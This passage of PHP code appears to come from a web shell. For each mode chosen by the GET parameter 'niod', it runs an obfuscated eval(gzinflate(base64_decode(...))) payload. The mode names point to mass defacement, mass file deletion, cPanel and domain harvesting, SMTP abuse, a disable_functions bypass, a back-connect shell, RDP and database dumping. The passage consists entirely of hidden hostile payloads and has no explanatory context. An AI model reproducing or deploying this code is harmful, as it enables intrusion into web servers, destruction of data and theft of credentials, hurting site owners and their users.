gPmbuVHrswODgaCK1EIAgBB8uAKGsDBK0FHzHDd+C9dZRSZ86LI7nyRNsXMAHedW9k7uYLVSWyeZVNzpMsY5Pyvb/5H/CjKswYCa5P8rvBC72I+244P73pqpVW+KnmK0mEqdgCsc59EYW7tYX3Z2t3XomN+/ONTRHcW4bPALy87NpQgxmTZvzeuPPBgvyp7syzf3O7Xh3dkLTy/U53wX/7cfBw/RvApqIHS7+DQ==')));
} elseif($_GET['niod'] == 'mass_deface') {
eval(gzinflate(base64_decode('7VRda9swFH3OYP/h0gWUQImzsTJIYsNGN7aHtYPurYSgSHKt1baMpbQJpf99urKk9HNr6MZeRogt6+qee+65x85XNTNS1UCXtWorWi4qxcWgz2W7369pRXNZiv2+1HKhWSsbM4Srly96vVy1grJi0P8BVEO/VOdUyyFGZD6QenHZSkOXZYc09Ek9fKCQgma0tssuOHWhCOiOIKZdLEOiy2Q2cw8XiYvtTX2oK26D7tCIJGQUqfszlpTLgTRNgYxIxO3hoUWzMgumaiNqowcebx9udu1xrkGUWtxBey5cTO6kC8Kw4Rb2IVVvxXtxIVihYO90llsCwFSp2vTVhzH+ssPjo4+zBAPZPMxstmyzoOTO/FF9yddW+vv2YY/4J6Ze+4W/dzd3xQv+82DOnaz534D/xIBP9h0ST6I+z/Tf702EWi2+HZ98PyXa0NaQ+dYnIWA2jSBzQDGDkaOkXV8zLi9Am00pUlLR9kzWEzho1kBXRk2hoZzL+sxtkdDOnVfCl+IoL5nbduIG9nxzp+vR8pzeJJBYBh56a4L7/P8U+7/GHceydZ0/wOyohTeC37LvYwWVMIXiKWmUNiSzQWev7ESUghnAtmHinYVGwgOytvZxoZS0lEtFwHrNPjiR4IKWK/vgZQJWCHYueHZcC7DNPTE7miR7X5Yuzxd3TD6pkov2l8SMWJuA3KkaoPsNNQUJw7qU3BQTeHswbtZTAoWQZ4VJyesxyW6XtGNAtB2KuslFOaTio8JUOxf+UnOxBix/rzSWo/ab6it6ZzxYwONP4M3Y1cs+U5wKLDdwpJDbu1kS4B5sTa+WlYzNde956O0r1RoORU6ZeKQ9B5eg4bJZ4q0Yv0vXPwE=')));
} elseif($_GET['niod'] == 'mass_delete') {
eval(gzinflate(base64_decode('lVNNi9swEL0X+h8GN6AEFntLdy9x7FPppZQttLclBEVSYrGyZCx510vJf68ky47z4W3XgSBr3sx7M2+8ayQxXEkosdYbygQzbD6jvL6ZSVziHRdsAX8+fuC7Odebl5obvBUdYuEDAOBeMGSgCZb22AVTH9qpmmFSzDsI1h677RMhJBObHLlD4sNReowK9YQ1t3GPi1GC4kHYEWbV+UzIsgxQjMYEIe4SNqzl2uh54OrrRItzvHsaKbh8usSmJ8jD8HYAJjQ7U/JvKVFs4bZ6mGkc/a+uNxPfFnkpyXrbO0eusl7x/zrwSo/BxEm4exgpFESPq52SBogSqs4+3X1xv/zh+ypx1/m6X4fVts6jdLJWmFBPOw2ccdra1TpffTLa/evJh4vbw9TA/cn+D4duPrPNz4dfvx+RNrg2aO1H081gRfkzaPMqWIZKXO+5XMJ91QJujEqhwpRyufdXyA/hRH2oSp2baH0DxwvXjeVJB5rE8vRTPFmLECdMGjbMOVza77mEkplC0QxVShuU+7D3Lf+mBGU1LINfzqYuymXVGDCvle3JsNYgcIubBZ3wjEVj32YVNgXqe3/h1BRLuLu/rdoUQcH4vjAZ+nyLRoU7Wtuaq/cuYj8PqAQmrPCyMyS5onFVVO+TMKbQzbbkA0nnbd/dD+sTfPU+TRCEgokbcr5KggGjZT/8BQ==')));
} elseif($_GET['niod'] == 'vhost') {
eval(gzinflate(base64_decode('fVP9T9swEP25SPwPR4bkVAPCVrppo6lEGGuLNLaV8jlNlWM7xIo/othN2k773+f0C4RgiS6y7957uju9MJJq8DqJLiRIZlNNQ/Tj++UIASaWaxUi1PWOt7cabAkkTFlWdDuxi0QrC4bPWYiOUDea5dgYuJxJwVUGZV8b2wlqzBLt4iUhrvKJBTvLnYqZxJJbBCUWE3ddKdYZhaVLxIvElCIgwh1CpDOGup1gpbWQb/AEfG4Ms/7uuJ7k1yPtd7P5Z3sLXnlkRnnhI1ZyMbYVV+MydSOgPTj82G43j18nkvRF4v8oZmYskz4SCvYNBLDhLliNRmM3KUnGJIRo1IoO8c2nCZlF57EcCta7ng/O7su4Ny3pu4t2fDXNY2nnX37mZ/j2XNy1hiVRYok9jeakdeHi2wT3h9Zhovve8IrdRmLQHx7R05MJ6aXVKj+4u2lnce969rSG1g1xwSCEROdM+d5BajEhzBhvz6ve7nvNY9itCm4XkOXBX1L2YmzYh6MxZURT5q8Ga9aESGet3BHM0jO+Fzi1Z2v01gspbOgtjIQhLVgSPsMFmzuMToa9s1GIxrHAKkNPjdrqngpOMuizgu2s3RnglXXW3nzEvweihS7CN9Fh/XZdF3UPF9rN9xkGCXzVRcwpZQqq1H3q5XD1AEGJi6CqqmDRmwmolpirA6JlTYdcMLcUwJRCam1ONTE7dYFNsXQ1J/26QLBmbNrf2P8vrAYI6v/ZJf4B')));
} elseif($_GET['niod'] == 'smtp') {
eval(gzinflate(base64_decode('hVRNi9swED270P8wVQPrQKgKve06PrSXZaFQ6N5KMbIyjpTKkpFkumzb/16N7WySErsYGaH3oafxyCiVA1ZItBF9WdRpNM5GCPoZtx/KR6UDROcM/NTGQOilRNyBbsD3FrSFqBCks43eQ+PMDv078sAn0XYG4Ra+FbrkyrXI+4Ced31ttKxUbA232u2qUbv3oi64Lr8XnHYvC34WiN29fpU1vZVROwtBHvLVTvs1/ErLGU0FbNOysGk6QiTIGudRSJWPDBGAJvUky3STv9GharTBnBHCB5it13ScqG2Pg0u2Em2tTdqBqNUeI0WOKV241P3DDtFXHjsjJPmzDbA0RnSipgSdx33ViphSMv7waSjF74NzrRH8RD9GzlahjV2lXIhpgwH7IaLIR9qGETqBN2zDbo6ZJp3oo5rVTeA1HX23Wd0EXtN1IoRZ3QRe1Tk/f74JvKYLKHuPs8oX+FKLQ/9//fz4Be5T7W5hbH/pjPPbtx/f01OeCn/sz2NbXjpQuiUHwpcdqJ5LDoT/J0Oq7GKGhC87UC8sORC+7DDWesljZJy5nDn9oTe9aCR6FyvV099guOaH0xUfdjwn3P0F')));
} elseif($_GET['niod'] == 'bypdisf') {
eval(gzinflate(base64_decode('hVJNS8QwED1vof8hWxa2BWl/gGkvi6IHWaHeREqazthgmpR8KIv432273V0Fi6eQmffevDcJ8FaTiHJQDkxBa1NE12GwWsGxjtp0pAPX6ibvtXUFFar3jrhDD7n1dSccUayDXChB3pn0kG/7tk+H65Zki+jWcTjB09YxzsHaiZCNE2cPAmNhLbh4Uz3uy6fn7aj6kiRh8Dm2NygkkJyg7kHF0Tw2Si7+8cMIB/EEvIoaYVktoUKvuBNa2VxpBWFgGULV6WbU2iMO7FkDudR2pic/t8JIawAvSYudFPyN3IGBNc3YZP/rD/9j7OUA50UsR6D3+KAbP7AGv5UF7ofuIeVFGJTAb4UcHvFGvQoFxyTnYsmZGj0cyzQ76RT/pz3bIqWfTvRSHsjOAHPQrKesJ3REs18/6Rs=')));
} elseif($_GET['niod'] == 'autoeu') {
eval(gzinflate(base64_decode('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')));
} elseif($_GET['niod'] == 'domains') {
eval(gzinflate(base64_decode('ZVLNjtsgEL5X6jtMyUrg1Sps97jGaA/tI/QURRHBYxvJBgvwOm2Udy/EcQ5ZcRlmPsbfj1F3DojQaCN6KWrzCbpXIVR0+Ht0JyrFCKo3ra3ogqHrXLenNyp/uUEZG0DZGv4E9EHwUZLyqX5d+hV8NKZHRjhGza0asN5qZxtSlKZhP1Zcca5NAq08fnvvPLyDVpZG8Khq2MHDBtgLfoOnZRfMQqiI6tgjmLoiborjFIkU0cOx1a53vtpozCf16pW54KnO92lhn288eknLxqUP647dtagAt7o4J/LosTWM/HMWycs6KM5jah8GFXV3UH3P6CYDgLDtc0E29GVdkYuFQVE2/RQ6dnUkRN+jZdGbga2A3c/97nVfFCDhrTg/ZaLJ19EFczq0GMd5MjW72uxmi/7m9WeKTQUMnGwfF5W4pJ5kZuVCQeexqboYx3fO53nePr7ZEi6/9gRX8u5fGmdmO5ojotfp6iW5K7xcrkFRwdOfJu8B0vL7t/8=')));
} elseif($_GET['niod'] == 'cpanel') {
eval(gzinflate(base64_decode('nVNda9swFH0v9D/cuRmyobHXtIzNdjwGNfRlNCRhL6UY2ZZjMVsSkhynlP33XcVN9wFjMIIDOtf3nnPPkVnVSiBpxYRlOktrvgdjnzq29Eqpa6bnmtZ8MDG8V4dE0brmYhfDjTrAAoGR17aNYXHzNum4YPOW8V1rHYDFklbfdloOoo7BaiqMohppkkp2Usdjyy1LvCwtkba9zqoVFayDNTPMphECqcrOz9JG6h5oZbkUS+/Cg57ZVtZLT0ljXXMGeU95BzGkUZmlXKjBgn1SuABzBQ8E7X8eTru9SptPamCS00iB6j8qHEFb2dMXrRdXufslHkS/U5ih7Lk9cZxOe9oNeNwwUb95pfy7qyfSQwJ/0CFb5AyYTIoUPhgQ/r/ERZLzs9lgmIYl7JgtqkE7hwsH+YErGtwKi7Nik6+/5usHcrfdroq7+82WPLo6V2bqZWLvk3X+5X6bF59vb9fEtfPG5wbz8GfFClseyLQheQyCZ2w+enqcPlWP52nu6CRNQEzC6U2HNwg3UjHhkwgNZhEWndqQRGGl3A2IKrTDBS4aSS6BjEclzahxE3/WXALODhJAqOqkcVDwz8H/NRFva++WcxaGJF68+3AdaXc7FTXmk7FU2+WVS4BNn1CpMa5TMOGxPSS/RAXffwA=')));
} elseif($_GET['niod'] == 'backcon'){
eval(gzinflate(base64_decode('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')));
} elseif($_GET['niod'] == 'rdp'){
eval(gzinflate(base64_decode('1Vhhb+I4EP28J91/GLxIgNQrW9B9aYFVt82q6PYAFXrVqqqQSQxEDXE2cdpyq/73GydxSEiAcLC3ulZtiT1+fmPPm5nUnFY94QruOw5zq54/wafq4GYw7g9P4MMJNGs1aLfbULnv9io1+A4fOy2d2YK5ndbErYe/fv3lXfDVMsxnMI020Tla2OI3i00FiafRYMrdBVBdmNxuEwILJuYc7R3upe0EnVgMJtw1mNsmZ84riR50bnEced8wGpPGhIDOLMuhhmHaszb5He0SKAiDLKfIBTzzb9YmDYkTIbzMTcFI5+pWuxxpcHs9aNWlZadVF0YKo44ga5iJR3w2wj06dx5zbbpgG4ASlnAOW41M2/EFiKWDnAV7FQRAAreJH21BwGXffNNlxgF8B9TzXvBQfyBfJ9riML7yyjyHYsQ0CVDLnOGnMAZJeu+5aRjMJtHmT94cg4PAM7V8fDxbM8ZYX5hCGasnZX3lMirjYwddfJSRmhqRMZ4aQFUkn5OKOaJmjiWazA3suAKYzNbwd2muPxh1+71sKNUzV58lUlBrxYJ3U/SGIeGu1OZYVGdzbgUHexcP58hhDx926e8YPsyoLUznZc0DtXM2vPdy4DKIySPQTw28a3nMYrqIPKBPnoknnTZBI+7IzRPiHs75C6ziIpzfta5BOte4m2B7r2xi7ZhTe8ZgdY+5K1v10J81twsdfPHs1tgru2mvTPfz0ls2HRdIcKkWIJXtWnXVK6gP0UzrozN3AMxptTwe9Iejh0pIsfIoe4zEcOhm5bEt71jOld2x1CW0QZkomVYeL+SsrDmJWVWCgll9YYx19qQQAuwxw8OoEpsJkMOkdiH3d1w2Gy+o0OdVUo/2rJOTNESt9h2YPudQntElHbuci9PI9lSmSawhxhLoMzUteYjktMwv4I1ZHpOOSCRMwtvIAEngBZ+lO/i5jgsl0xhk5mIL553l4Fhcp1YwDZfGwrRN7PCo4K6XAt8A2NgDsAheszAe8/MBZWwkTy7nCkii/jQ6D6+PiGsEAsdElMRUylXD0eGGy8Oa9f7TB/ndGfq6zjyvFOex8E/cAqfv9r9g9BmjihmlTUxCDtmNBy6XjmDpD/b3TmBgMYqs76kpgAJeAGaG09MQK33eUZAVOvIrbs/wGn2LypzolUJvk76mlkTnO/Uta6k4bvEuOOcstcYPoJYfCAcSbR6V6OEMi7AZctddFqMgY9N3GQiuCOwdp0PmPuNOXXvKE+1DFJQFyAbLu4NQSOOhdvuXdvtAbkajwfgGCwN5xEVJSusAqh+AtEK3ronVu2K8UnGZr61O+pJ1YITNxRNgqcVCIMWK4sThPIA3eYgqzLJlsxGUzWgXTyxTxVx2J8FQpPRouWy6VM2N12JJRHc21cwshxgkZFBWdTpRnN1U7S5cnaFaYgtHLKsxpqzEmaqtJnPrdtHyq0BkCbrWvmgjbVsV2pZvU5kWE2x8lVCPfheK7ExSuGUL/hw2sBALJbkq7UXKIjdzQKmUR27PdPGV0TmcV49IL6p4W8gVpHeJqekr9+EPM3gHhj/Zx9JK8Of5LCFBE7byhK6Aa8486HEB2iv2M3iicDBrFT6abKRBzBl8Nl3EjoljtjXCl5kd222WajObLCCRLeQFxvlit6BV750wiF5I/w96/1fdZvROKG8nvpd0U5eIdWoba5PqxLaX9sMFGtHMUFxnaFB7P4Y/RaOV7erM7eOUSO3KSqM/TaLyJ35FXsn0LRZrrMnQdvU/+MQVVCLXKp1Rv/9lCFeXvV5/BJ80uBtq1ycwutFA9kHdKw26Q5Bz993edf9+uHqrURTk/v8A')));
} elseif($_GET['niod'] == 'adminer') {
eval(gzinflate(base64_decode('vVNda9swFH3OYP/hYgx2wNiPg80xZK0zDKlTFGdQxjCKclWLOZKRZDoY+++Va5tltBvdyx6EdO895+h+SD7v2xZWYKyuNXYtZRj69T4nn3PyJbjeXR1u8rKqyW5XBV8j8LwI/I7aZvnh7ZsF7yWzQkmgp7OQqEO/160DCCOW8MMBFj7vnDhXHcpwcDuFB++Ju/BZ40LMMWohhQ1HLyxg9Bm0qrOhQ0VwdSDb3W1Vu82pu+grsB+Lck3uKrIu95ucRGB1j6+gkbw6kPKfafv9tnYdKzZ3t/lA47Q1Mw/+ytwU29wVxbsRrdH2Wo5w/I5sAD/TYa0y+CvCJ3vWUMeat71pppZenH+6JXjIRYtOXRhrwmCaXdw1XbCcxoasUeClDKVFnaVcSZulFBqNfBX4w5NJLmlgqb5HuwrqY0vltyDLYH19U5Q5ge3uU1FCmiY0S5NRJ5lkvaeMAF2nxltdZvND8hprO/M+STR9iO+Fbfpjb1AzJ+DIMVPnpFRSqNO7RI77hIqFSs5UyMv8vMi7tOYi/2OVv5X54r0b6mZyAquAaaQWYZjR/K/iP4gO/XsE')));
} elseif($_GET['niod'] == 'dbdump') {
